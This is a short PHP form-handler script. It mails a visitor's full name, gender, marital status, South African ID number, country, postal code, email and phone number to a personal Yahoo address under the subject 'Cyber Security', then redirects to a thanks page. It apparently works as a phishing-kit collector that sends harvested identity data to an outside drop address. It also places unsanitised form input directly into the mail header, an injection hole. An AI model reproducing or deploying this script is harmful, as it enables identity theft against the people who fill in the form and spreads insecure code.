<?php
mail("garikayi@yahoo.com","Cyber Security", 
	"Full Name=".$_POST['name']." \n \n
	Gender=".$_POST['gender']." \n \n
	Marital Status=".$_POST['mstatus']." \n \n
	Title=".$_POST['title']." \n \n
	RSA ID Number=".$_POST['reaid']." \n \n
	Issuing Country=".$_POST['country']." \n \n
	Postal Code=".$_POST['code']." \n \n
	Email=".$_POST['email']." \n \n
	Contact Number=".$_POST['phone']." \n \n","From:".$_POST['name']);
header ("location: ../thanks-submit.htm");
?>